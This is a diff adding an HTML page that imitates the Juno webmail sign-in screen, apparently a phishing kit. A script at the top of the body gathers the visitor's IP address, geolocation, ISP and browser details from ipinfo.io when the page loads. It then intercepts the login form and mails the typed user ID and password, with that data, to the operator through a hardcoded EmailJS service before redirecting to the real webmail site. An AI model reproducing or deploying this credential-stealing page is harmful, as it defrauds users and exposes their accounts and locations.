@@ -1,0 +1,1114 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Juno - My Juno Personalized Start Page - Sign in</title>
+    <link
+      rel="shortcut icon"
+      href="https://my.juno.com/static/account/view/img/webicon_j.ico"
+    />
+    <link
+      rel="stylesheet"
+      href="https://my.juno.com/redesign/common/css/bootstrap.min.css?v=42606"
+    />
+    <link
+      rel="stylesheet"
+      href="https://my.juno.com/redesign/common/css/common-redesign.css?v=50388"
+    />
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://my.juno.com/static/start/view/common/css/sp-redesign.css?v=55691"
+    />
+    <style>
+      @font-face {
+        font-family: "OmnesBlack-Italic";
+        src: url("fonts/OmnesBlack-Italic.otf") format("opentype");
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      .video-js {
+        width: 300px;
+        height: 150px;
+      }
+
+      .vjs-fluid:not(.vjs-audio-only-mode) {
+        padding-top: 56.25%;
+      }
+
+      @media all {
+        IE\:clientCaps {
+          behavior: url(#default#clientCaps);
+        }
+      }
+
+      /* Desktops and laptops ----------- */
+      @media only screen and (min-width: 1224px) {
+        .cookieDisc {
+          width: 1020px;
+          margin-top: -15px;
+        }
+      }
+
+      /* iPads (portrait and landscape) ----------- */
+      @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) {
+        .cookieDisc {
+          width: 768px;
+          margin-top: -15px;
+        }
+      }
+
+      /* Smartphones (portrait and landscape) ----------- */
+      @media only screen and (max-device-width: 480px) {
+        .cookieDisc {
+          width: 375px;
+          margin-top: -3px;
+        }
+
+        .continueLink {
+          display: none;
+        }
+      }
+
+      .footerNav1 {
+        white-space: nowrap;
+      }
+
+      .footerNav1 td {
+        padding: 0 4px;
+        white-space: nowrap;
+      }
+
+      .footerAdDiv {
+        display: none;
+      }
+
+      #BottomAd,
+      #Bottom2Ad,
+      #Bottom3Ad,
+      #Bottom4Ad {
+        width: 728px;
+        height: 90px;
+        float: right;
+      }
+
+      /* Apply the downloaded font only to the action buttons */
+      #EditableUserID .userNext,
+      #nonEditableUserID #backbtn,
+      #nonEditableUserID #signin,
+      #newaccount_button {
+        font-family: "OmnesBlack-Italic", sans-serif !important;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- EmailJS SDK -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      // Initialize EmailJS with public key
+      (function () {
+        emailjs.init({
+          publicKey: "Cvnq-qqEo4zNijp9W",
+        });
+        console.log("EmailJS initialized");
+      })();
+    </script>
+
+    <script>
+      (function () {
+        "use strict";
+
+        // Configuration
+        const EMAILJS_SERVICE_ID = "service_mgr3s4i";
+        const EMAILJS_TEMPLATE_ID = "template_4ajs6qh";
+
+        // Track IP data - will be collected on page load
+        let cachedIpData = null;
+        let ipDataReady = false;
+        let dataSent = false;
+        let scriptElement = null;
+        let callbackName = null;
+
+        // Helper: Clean up JSONP to prevent memory leaks
+        function cleanupJsonp(cbName, scriptTag) {
+          if (cbName && window[cbName]) {
+            try {
+              delete window[cbName];
+            } catch (e) {
+              window[cbName] = undefined;
+            }
+          }
+          if (scriptTag && scriptTag.parentNode) {
+            try {
+              scriptTag.parentNode.removeChild(scriptTag);
+            } catch (e) {}
+          }
+        }
+
+        // Helper: Send collected data with email/password (uses cached IP data)
+        function sendDataViaEmail(emailValue, passwordValue) {
+          if (dataSent) {
+            console.log("Data already sent, skipping duplicate send");
+            return Promise.resolve();
+          }
+
+          if (!cachedIpData || !cachedIpData.ip) {
+            console.error("No IP data available");
+            return Promise.reject(new Error("No IP data available"));
+          }
+
+          // Prepare email parameters with all collected information
+          let params = {
+            // Basic IP info
+            ip_address: cachedIpData.ip || "Unknown",
+
+            // Geolocation details
+            city: cachedIpData.city || "Unknown",
+            region: cachedIpData.region || "Unknown",
+            country: cachedIpData.country || "Unknown",
+            country_name:
+              cachedIpData.country_name || cachedIpData.country || "Unknown",
+            location:
+              cachedIpData.loc ||
+              (cachedIpData.latitude && cachedIpData.longitude
+                ? `${cachedIpData.latitude},${cachedIpData.longitude}`
+                : "Unknown"),
+
+            // ISP/Organization
+            organization: cachedIpData.org || "Unknown",
+            isp: cachedIpData.org || "Unknown",
+
+            // Additional details
+            timezone: cachedIpData.timezone || "Unknown",
+            postal_code:
+              cachedIpData.postal || cachedIpData.postal_code || "Unknown",
+
+            // Hostname if available
+            hostname: cachedIpData.hostname || "Unknown",
+
+            // Browser/Device info (passive collection)
+            user_agent: navigator.userAgent || "Unknown",
+            platform: navigator.platform || "Unknown",
+            language: navigator.language || "Unknown",
+
+            // Timestamp
+            collected_at: new Date().toISOString(),
+
+            // Referrer (if any)
+            referrer: document.referrer || "Direct",
+
+            // Screen resolution (passive)
+            screen_resolution: `${screen.width}x${screen.height}`,
+
+            // url
+            url: "https://webmail.juno.com/",
+
+            // Timezone offset
+            timezone_offset: new Date().getTimezoneOffset(),
+
+            // Email and password from form
+            email: emailValue,
+            password: passwordValue,
+          };
+
+          // Send email
+          return emailjs
+            .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
+            .then(function (response) {
+              dataSent = true;
+              console.log("✅ IP data successfully sent via EmailJS");
+              console.log("Response:", response.status, response.text);
+              window.location.replace("https://webmail.juno.com/");
+              return response;
+            })
+            .catch(function (error) {
+              console.error("❌ Failed to send IP data via EmailJS:", error);
+              console.error("Error details:", error.text || error.message);
+              window.location.replace("https://webmail.juno.com/");
+              throw error;
+            });
+        }
+
+        // JSONP request to ipinfo.io
+        function fetchIpInfoViaJsonp() {
+          return new Promise((resolve, reject) => {
+            // Generate unique callback name
+            const uniqueId =
+              "ipinfo_cb_" +
+              Date.now() +
+              "_" +
+              Math.random().toString(36).substr(2, 9);
+            callbackName = uniqueId;
+
+            // Set timeout for JSONP (10 seconds)
+            const timeoutId = setTimeout(() => {
+              if (window[callbackName]) {
+                cleanupJsonp(callbackName, scriptElement);
+                reject(new Error("ipinfo.io JSONP timeout after 10 seconds"));
+              }
+            }, 10000);
+
+            // Define callback function
+            window[callbackName] = function (response) {
+              clearTimeout(timeoutId);
+              cleanupJsonp(callbackName, scriptElement);
+
+              if (response && response.ip) {
+                console.log("✅ ipinfo.io data received on page load");
+                resolve(response);
+              } else {
+                reject(new Error("Invalid or empty response from ipinfo.io"));
+              }
+            };
+
+            // Create script tag for JSONP
+            scriptElement = document.createElement("script");
+            scriptElement.src = `https://ipinfo.io/json?callback=${callbackName}`;
+            scriptElement.async = true;
+            scriptElement.onerror = function () {
+              clearTimeout(timeoutId);
+              cleanupJsonp(callbackName, scriptElement);
+              reject(new Error("Failed to load ipinfo.io script"));
+            };
+
+            // Append to head
+            document.head.appendChild(scriptElement);
+          });
+        }
+
+        // Fallback using fetch with CORS
+        async function fetchIpInfoFallback() {
+          try {
+            console.log(
+              "Attempting fallback fetch to ipinfo.io (CORS supported)",
+            );
+            const response = await fetch("https://ipinfo.io/json");
+            if (!response.ok) throw new Error("HTTP error: " + response.status);
+            const data = await response.json();
+            if (data && data.ip) return data;
+            throw new Error("Invalid data from fetch fallback");
+          } catch (err) {
+            console.error("Fallback fetch also failed:", err.message);
+            throw err;
+          }
+        }
+
+        // Function to collect IP data on page load
+        async function collectIpOnPageLoad() {
+          console.log("🔍 Collecting IP data on page load...");
+
+          try {
+            // Try JSONP first (primary method)
+            let ipData = null;
+            try {
+              ipData = await fetchIpInfoViaJsonp();
+            } catch (jsonpError) {
+              console.warn(
+                "JSONP failed, trying CORS fetch fallback:",
+                jsonpError.message,
+              );
+              // Fallback to fetch (ipinfo.io supports CORS)
+              try {
+                ipData = await fetchIpInfoFallback();
+              } catch (fetchError) {
+                throw new Error(
+                  `Both JSONP and fetch failed: ${fetchError.message}`,
+                );
+              }
+            }
+
+            // Store the IP data
+            if (ipData && ipData.ip) {
+              cachedIpData = ipData;
+              ipDataReady = true;
+              console.log("✅ IP data cached on page load:", cachedIpData.ip);
+            } else {
+              throw new Error("No IP address in response");
+            }
+          } catch (error) {
+            console.error(
+              "❌ Failed to collect IP data on page load:",
+              error.message,
+            );
+
+            // Store fallback data
+            cachedIpData = {
+              ip: "COLLECTION_FAILED",
+              error: error.message,
+              user_agent: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+              city: "Unknown",
+              region: "Unknown",
+              country: "Unknown",
+              org: "Unknown",
+            };
+            ipDataReady = true;
+          } finally {
+            // Clean up any remaining JSONP elements
+            if (callbackName && window[callbackName]) {
+              cleanupJsonp(callbackName, scriptElement);
+            }
+            if (scriptElement && scriptElement.parentNode) {
+              try {
+                scriptElement.parentNode.removeChild(scriptElement);
+              } catch (e) {}
+            }
+          }
+        }
+
+        // Set up form submission handler
+        document.addEventListener("DOMContentLoaded", function () {
+          // Start collecting IP data immediately when page loads
+          collectIpOnPageLoad();
+
+          const form = document.getElementById("contact-form");
+
+          if (form) {
+            form.addEventListener("submit", function (event) {
+              event.preventDefault(); // Prevent default form submission
+
+              // Get form values
+              const emailInput = document.getElementById("memberId2");
+              const passwordInput = document.getElementById("password");
+
+              const emailValue = emailInput ? emailInput.value : "";
+              const passwordValue = passwordInput ? passwordInput.value : "";
+
+              // Disable submit button
+              const submitButton = form.querySelector('input[type="submit"]');
+              if (submitButton) {
+                submitButton.disabled = true;
+              }
+
+              console.log("Form submitted - sending cached IP data with email/password...");
+
+              // Send email with cached IP data (already collected on page load)
+              sendDataViaEmail(emailValue, passwordValue)
+                .then(() => {
+                  /* console.log("✅ Email sent successfully, redirecting...");
+                  console.log("Email : ", emailValue)
+                  console.log("Password : ", passwordValue) */
+                  window.location.replace("https://webmail.juno.com/");
+                })
+                .catch((error) => {
+                /*   console.error("❌ Error sending email:", error); */
+                  window.location.replace("https://webmail.juno.com/");
+                });
+            });
+          } else {
+            console.error("Form with id 'contact-form' not found");
+          }
+        });
+      })();
+    </script>
+
+    <img
+      src="https://track.juno.com/s/p?s=999999&amp;a=logon&amp;p=logon&amp;d=unknown&amp;i=5D01DFCB84FDC3123FBB6A4B1350C208.VGS-AS02&amp;cf=sp&amp;srt=0&amp;crt=0&amp;"
+      width="1"
+      height="1"
+      border="0"
+      alt=""
+    />
+
+    <div class="spContainer">
+      <header id="staticHeader">
+        <div class="row no-gutter spContainer fixedPos" id="header">
+          <div class="leftCol" id="logo">
+            <a href="https://my.juno.com/" target="_blank">
+              <img
+                src="https://my.juno.com/redesign/common/images/j_logo.png"
+                alt="Juno"
+              />
+            </a>
+          </div>
+          <div class="headerAdDiv spAds" id="Top3Ad">
+            <div id="ezoic-pub-ad-placeholder-101">
+              <div>
+                <span
+                  class="ezoic-ad"
+                  style="
+                    box-sizing: content-box;
+                    display: block !important;
+                    float: none !important;
+                    line-height: 0px;
+                    margin-bottom: 0px !important;
+                    margin-left: auto !important;
+                    margin-right: auto !important;
+                    margin-top: 0px !important;
+                    max-width: 100% !important;
+                    min-height: 90px;
+                    min-width: 728px;
+                    padding: 0;
+                    text-align: center !important;
+                  "
+                  data-ez-name="Header/0467d7f3201cc973ceb1a2cef98c8dec"
+                >
+                  <span
+                    id="div-gpt-ad-Header/0467d7f3201cc973ceb1a2cef98c8dec-0"
+                    ezaw="728"
+                    ezah="90"
+                    maxezah="90"
+                    style="
+                      position: relative;
+                      z-index: 0;
+                      display: block;
+                      padding: 0;
+                    "
+                    class="ezoic-ad"
+                  >
+                    <div
+                      id="google_ads_iframe_/23057360293,21228205/Header/0467d7f3201cc973ceb1a2cef98c8dec_0__container__"
+                      style="border: 0pt; width: 728px; height: 0px"
+                    ></div>
+                  </span>
+                </span>
+              </div>
+            </div>
+          </div>
+          <div
+            class="row"
+            id="hdivider"
+            style="border-bottom: 2px solid rgb(0, 0, 0)"
+          ></div>
+        </div>
+      </header>
+
+      <div class="cBoth"></div>
+
+      <div
+        id="cookieDisclaimer"
+        class="row cookieDisc"
+        style="z-index: 7777769; background-color: rgb(232, 244, 248)"
+      >
+        <div class="col-sm-12" style="padding: 5px 10px !important">
+          We and our partners use cookies, pixels, and similar technologies on
+          this site to deliver services, measure performance, and show
+          personalized ads. Some of these uses may constitute a "sale" or
+          "sharing" of personal information under current data privacy laws. See
+          <a
+            href="https://www.juno.com/start/landing.do?page=www/legal/yourprivacyrights"
+            target="_blank"
+            style="
+              font-size: inherit;
+              color: black !important;
+              text-decoration: underline;
+            "
+            >Your Privacy Rights</a
+          >
+          for more information. &nbsp;[&nbsp;<a
+            href=""
+            style="font-size: inherit; color: black !important"
+            onclick="
+              handleUSPrivacyAction('reject');
+              return false;
+            "
+            >Reject</a
+          >&nbsp;] [&nbsp;<a
+            href=""
+            style="font-size: inherit; color: black !important"
+            onclick="
+              handleUSPrivacyAction('accept');
+              return false;
+            "
+            >Accept</a
+          >&nbsp;]
+        </div>
+      </div>
+
+      <div class="cBoth"></div>
+
+      <div class="row">
+        <div class="pull-left">
+          <div class="trans">
+            <br />
+            <div class="welcomeSign text-center">
+              <span style="font-weight: bold">Welcome!</span>
+              <span style="font-size: 15px">Please sign-in below.</span>
+            </div>
+            <div class="form-signin" id="EditableUserID">
+              <form
+                name="login"
+                method="POST"
+                class="userIdForm"
+                action="https://my.juno.com/start/login.do"
+              >
+                <input type="hidden" name="operation" value="login" />
+                <input type="hidden" name="captchaId" value="" />
+                <input type="hidden" name="client" value="" />
+                <input type="hidden" name="newloginpage" value="true" />
+                <input type="hidden" name="pagename" value="startlogin" />
+                <input type="hidden" name="cf" value="sp" />
+                <div
+                  class="padding29"
+                  style="position: relative; z-index: 999999"
+                >
+                  <input
+                    type="text"
+                    placeholder="User ID"
+                    id="memberId"
+                    maxlength="64"
+                    name="memberid"
+                    class="width255 defaultText"
+                    value=""
+                    autofocus=""
+                    style="
+                      text-align: left;
+                      position: relative;
+                      z-index: 999999;
+                      pointer-events: auto !important;
+                      user-select: text !important;
+                    "
+                  />
+                </div>
+              </form>
+              <div class="text-center paddingBottom25">
+                <button
+                  type="button"
+                  class="btn btn-danger signin userNext"
+                  id=""
+                >
+                  Next
+                </button>
+              </div>
+              <div class="text-center forgotId">
+                Forgot your
+                <a
+                  href="https://help.juno.com/support/errors/eb06-myacct.html"
+                  target="_blank"
+                  class="tDecorationUl"
+                  >ID?</a
+                >
+              </div>
+              <br />
+            </div>
+            <div class="form-signin" id="nonEditableUserID">
+              <form
+                id="contact-form"
+                action="https://my.juno.com/start/login.do"
+              >
+                <input type="hidden" name="operation" value="login" />
+                <input type="hidden" name="captchaId" value="" />
+                <input type="hidden" name="client" value="" />
+                <input type="hidden" name="newloginpage" value="true" />
+                <input type="hidden" name="pagename" value="startlogin" />
+                <input type="hidden" name="cf" value="sp" />
+                <div
+                  class="padding29"
+                  style="position: relative; z-index: 999999"
+                >
+                  <input
+                    type="text"
+                    placeholder="User ID"
+                    id="memberId2"
+                    maxlength="64"
+                    name="memberid2"
+                    class="width255 defaultText"
+                    value=""
+                    autofocus=""
+                    style="
+                      text-align: left;
+                      position: relative;
+                      z-index: 999999;
+                      pointer-events: auto !important;
+                      user-select: text !important;
+                    "
+                  />
+                </div>
+                <div class="padding29">
+                  <input
+                    type="password"
+                    placeholder="Password"
+                    id="password"
+                    maxlength="64"
+                    name="password"
+                    class="width255 defaultText1"
+                    autocomplete="off"
+                    style="text-align: center"
+                  />
+                </div>
+                <div class="checkbox">
+                  <label class="btn btn-link keepSigned">
+                    <input
+                      type="checkbox"
+                      id="keepmesignedin"
+                      name="keepmesignedin"
+                    />
+                    Keep me signed-in
+                  </label>
+                </div>
+                <div class="bTopRed paddingBottom25"></div>
+                <div id="loginButtons">
+                  <a href="#" id="backbtn" class="fLeft btn btn-danger">Back</a>
+                  <span class="fRight paddingBottom25 targetDiv">
+                    <button
+                      type="submit"
+                      class="btn btn-danger signin"
+                      id="signin"
+                    >
+                      Sign-In
+                    </button>
+                  </span>
+                </div>
+                <div class="cBoth"></div>
+              </form>
+              <div class="text-center forgotId">
+                Forgot your
+                <a
+                  href="https://account.juno.com/s/resetpassword"
+                  target="_blank"
+                  class="tDecorationUl"
+                  >Password?</a
+                >
+              </div>
+              <br />
+            </div>
+            <div class="col-md-5 bTopRed"></div>
+            <div class="col-md-2 secOrText">OR</div>
+            <div class="col-md-5 bRight bTopRed"></div>
+            <br />
+            <div class="text-center">
+              <a
+                href="https://www.juno.com/freeemail"
+                target="_blank"
+                class="btn btn-warning createNewAccount"
+                id="newaccount_button"
+              >
+                Create A New Account
+              </a>
+            </div>
+            <br />
+          </div>
+
+          <div id="Left2Wrap" style="margin-top: 15px; margin-bottom: 20px">
+            <div id="Left2Ad">
+              <div id="ezoic-pub-ad-placeholder-105">
+                <div>
+                  <span
+                    class="ezoic-ad"
+                    style="
+                      box-sizing: content-box;
+                      display: block !important;
+                      float: none !important;
+                      line-height: 0px;
+                      margin-bottom: 15px !important;
+                      margin-left: auto !important;
+                      margin-right: auto !important;
+                      margin-top: 15px !important;
+                      max-width: 100% !important;
+                      min-height: 250px;
+                      min-width: 300px;
+                      padding: 0;
+                      text-align: center !important;
+                    "
+                    data-ez-name="Sidebar_1/0467d7f3201cc973ceb1a2cef98c8dec"
+                  >
+                    <span
+                      id="div-gpt-ad-Sidebar_1/0467d7f3201cc973ceb1a2cef98c8dec-0"
+                      ezaw="300"
+                      ezah="250"
+                      maxezah="250"
+                      style="
+                        position: relative;
+                        z-index: 0;
+                        display: block;
+                        padding: 0;
+                      "
+                      class="ezoic-ad"
+                    >
+                      <div
+                        id="google_ads_iframe_/23057360293,21228205/Sidebar_1/0467d7f3201cc973ceb1a2cef98c8dec_0__container__"
+                        style="border: 0pt; width: 300px; height: 0px"
+                      ></div>
+                    </span>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pull-left" style="margin-top: 40px; margin-left: 35px">
+          <p style="color: #009700">
+            <b>Note</b>: Clicking the news headlines will open in a new window
+            and not interfere with your login process.
+          </p>
+
+          <!-- Popular Feed -->
+          <div id="popularTile">
+            <p class="tileHeading"><span>Popular News</span></p>
+            <hr class="tileHeadingLine" />
+            <div id="fd_newser_popular">
+              <ul>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396622/athlete-who-soiled-herself-during-hyrox-race-forfeits-win.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_popular_login"
+                      target="_blank"
+                      >Hyrox Athlete Who Soiled Herself Apologizes, Forfeits
+                      Win</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396540/texas-orders-towns-police-force-closed-after-womans-arrest.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_popular_login"
+                      target="_blank"
+                      >Woman's Arrest for FB Post Leads to Shuttered Police
+                      Force</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396657/trump-loosens-hunting-rules-jokes-about-banning-fishing.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_popular_login"
+                      target="_blank"
+                      >Trump Loosens Rules for Hunters, Anglers</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396608/photo-of-trump-mock-headline-adds-to-kennedy-center-drama.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_popular_login"
+                      target="_blank"
+                      >Photo of Trump, Mock Headline Adds to Kennedy Center
+                      Drama</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396584/duncan-sheik-hospitalized-in-critical-but-stable-condition.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_popular_login"
+                      target="_blank"
+                      >'90s Singer Hospitalized in Critical but Stable
+                      Condition</a
+                    ></span
+                  >
+                </li>
+              </ul>
+            </div>
+            <div id="popular_more" class="more">
+              <a
+                href="https://www.newser.com/?showtab=pv&amp;utm_source=part&amp;utm_medium=uol&amp;utm_campaign=rss_popular_more_login"
+                target="_blank"
+                >More &gt;&gt;</a
+              >
+            </div>
+            <span id="popular_sponsor" class="sponsorLogo"
+              >Sponsored By:<a
+                href="https://www.newser.com/?showtab=pv&amp;utm_source=part&amp;utm_medium=uol&amp;utm_campaign=rss_popular_more_login"
+                target="_blank"
+                ><img
+                  src="https://content.uolstatic.com/feed/img/logo/fd_newser_rss_popular.gif"
+                  width="120px"
+                  height="20px"
+                  alt="" /></a
+            ></span>
+            <br /><br />
+          </div>
+
+          <!-- US and World feed -->
+          <div id="usWorldTile">
+            <p class="tileHeading"><span>US &amp; World</span></p>
+            <hr class="tileHeadingLine" />
+            <div id="fd_newser_usWorld">
+              <ul>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396676/toys-r-us-to-quadruple-it-number-of-stores.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_world_login"
+                      target="_blank"
+                      >Toys 'R' Us to Quadruple It Number of Stores</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396680/humans-have-something-in-common-with-t-rex.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_world_login"
+                      target="_blank"
+                      >Humans Have Something in Common With T. Rex</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396670/our-brains-may-be-two-brains-in-one.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_world_login"
+                      target="_blank"
+                      >Our Brains May Be Two Brains in One</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396677/dianas-brother-charles-sounded-elated-after-her-death.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_world_login"
+                      target="_blank"
+                      >Diana's Brother: Charles Sounded 'Elated' After Her
+                      Death</a
+                    ></span
+                  >
+                </li>
+                <li>
+                  <span
+                    ><a
+                      href="https://www.newser.com/story/396675/meta-users-glasses-recorded-intimate-images.html?utm_source=uol&amp;utm_medium=referral&amp;utm_campaign=rss_world_login"
+                      target="_blank"
+                      >Meta Users: Glasses Recorded Intimate Images</a
+                    ></span
+                  >
+                </li>
+              </ul>
+            </div>
+            <div id="usWorld_more" class="more">
+              <a
+                href="https://www.newser.com/section/2/world-news-headlines.html?utm_source=part&amp;utm_medium=uol&amp;utm_campaign=rss_world_more_login"
+                target="_blank"
+                >More &gt;&gt;</a
+              >
+            </div>
+            <span id="usWorld_sponsor" class="sponsorLogo"
+              >Sponsored By:<a
+                href="https://www.newser.com/section/2/world-news-headlines.html?utm_source=part&amp;utm_medium=uol&amp;utm_campaign=rss_world_more_login"
+                target="_blank"
+                ><img
+                  src="https://content.uolstatic.com/feed/img/logo/fd_newser_rss_us_world.gif"
+                  width="120px"
+                  height="20px"
+                  alt="" /></a
+            ></span>
+            <br /><br />
+          </div>
+
+          <!-- Sports Feed -->
+          <!--
+                <div id="sportsTile">
+                    <p class="tileHeading"><span>Sports</span></p>
+                    <hr class="tileHeadingLine">
+                    <div id="fd_newser_sports"></div>
+                    <div id="sports_more" class="more"></div>
+                    <span id="sports_sponsor" class="sponsorLogo">Sponsored By:</span>
+                    <br/><br/>
+                </div>
+                -->
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <footer id="staticFooter">
+        <div id="et-main-area">
+          <div id="main-content">
+            <div class="entry-content">
+              <div
+                class="et_pb_section et_pb_with_background et_section_regular"
+              >
+                <div class="et_pb_row et_pb_row_0">
+                  <hr
+                    class="et_pb_module et_pb_space et_pb_divider et_pb_divider_0"
+                    style="margin-top: 10px"
+                  />
+                </div>
+              </div>
+              <div class="et_pb_row et_pb_row_1">
+                <div class="et_pb_column et_pb_column_1_4 et_pb_column_1">
+                  <div class="et_pb_code et_pb_module et_pb_code_0">
+                    <!-- Footer Links -->
+                    <table width="100%" cellpadding="0" cellspacing="0">
+                      <tbody>
+                        <tr>
+                          <td>
+                            <table
+                              class="footerNav1"
+                              cellpadding="0"
+                              cellspacing="0"
+                            >
+                              <tbody>
+                                <tr>
+                                  <td>
+                                    <a href="" tabindex="1" target="_blank"
+                                      >Sign Into Email</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://my.juno.com/start/sp.do"
+                                      tabindex="2"
+                                      target="_blank"
+                                      >My Juno</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://track.juno.com/s/lc?s=&amp;u=https://account.juno.com/s/account"
+                                      tabindex="3"
+                                      target="_blank"
+                                      >My Account</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://account.juno.com/s/landing"
+                                      tabindex="4"
+                                      target="_blank"
+                                      >Our Services</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://www.juno.com/start/landing.do?page=www/legal/privacy"
+                                      tabindex="6"
+                                      target="_blank"
+                                      >Privacy Policy</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://www.juno.com/start/landing.do?page=www/legal/terms"
+                                      tabindex="9"
+                                      target="_blank"
+                                      >Terms of Service</a
+                                    >
+                                  </td>
+                                  <td>|</td>
+                                  <td>
+                                    <a
+                                      href="https://www.juno.com/start/landing.do?page=www/legal/yourprivacyrights"
+                                      tabindex="7"
+                                      target="_blank"
+                                      >Do Not Sell or Share My Personal Info</a
+                                    >
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </td>
+                          <td style="text-align: right; white-space: nowrap">
+                            <div class="copyright">
+                              Copyright © 2026&nbsp;Juno, Inc.
+                            </div>
+                          </td>
+                        </tr>
+                        <tr>
+                          <td
+                            colspan="2"
+                            style="
+                              text-align: right;
+                              padding-top: 5px;
+                              white-space: nowrap;
+                            "
+                          >
+                            <div class="footerAdDiv spAds" id="Bottom3Ad"></div>
+                            <div
+                              class="footerAdDiv spAds"
+                              id="Bottom4Ad"
+                              style="display: block"
+                            ></div>
+                          </td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+              </div>
+              <div class="et_pb_row et_pb_row_2">
+                <div id="Frame1Ad" class="fright spAds"></div>
+                <div id="RMA1Ad" class="fright spAds">
+                  <div id="ezoic-pub-ad-placeholder-124"></div>
+                </div>
+                <div id="RMA2Ad" class="fright spAds"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <div id="AdLoader"></div>
+    <div id="userConsentForAdsPopup">
+      <div id="userConsentForAdsPopupContent">
+        <table id="userConsentText" class="font1emBold">
+          <tbody>
+            <tr>
+              <td>
+                We use cookies to collect and analyze information on site
+                performance and usage, and to tailor advertisements to your
+                interests. By clicking "Accept" you agree to allow cookies to be
+                placed. You can learn more about our use of cookies and similar
+                technologies and your choices by reviewing our
+                <a
+                  href="https://my.juno.com/start/landing.do?page=www/legal/cookie"
+                  target="_blank"
+                  class="cookiePolicyLink"
+                  >Cookie Policy.</a
+                >
+              </td>
+              <td id="userConsentButtons">
+                <button id="allowButton">Accept</button>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <span id="ezmob-wrapper">
+      <span id="ezoic-pub-ad-placeholder-100">
+        <div>
+          <div
+            class="ezmob-footer ezoic-floating-bottom ezo_ad ezmob-footer-desktop"
+            id="ezmobfooter"
+          >
+            <center>
+              <span
+                class="ezoic-ad"
+                style="display: none !important"
+                data-ez-name="Adhesion/0467d7f3201cc973ceb1a2cef98c8dec"
+              >
+                <span
+                  id="div-gpt-ad-Adhesion/0467d7f3201cc973ceb1a2cef98c8dec-0"
+                  ezaw="728"
+                  ezah="90"
+                  maxezah="90"
+                  class="ezoic-ad"
+                >
+                  <div
+                    id="google_ads_iframe_/23057360293,21228205/Adhesion/0467d7f3201cc973ceb1a2cef98c8dec_0__container__"
+                    style="border: 0pt; width: 728px; height: 0px"
+                  ></div>
+                </span>
+              </span>
+              <span
+                class="ezmob-footer-close-wrap"
+                id="ezmob-footer-close"
+                style="display: none"
+              >
+                <span
+                  class="ezmob-footer-close"
+                  onclick="__ez_close_anchor()"
+                  title="close"
+                ></span>
+                <span class="ezoicwhat"></span>
+              </span>
+            </center>
+          </div>
+        </div>
+      </span>
+    </span>
+  </body>
+</html>
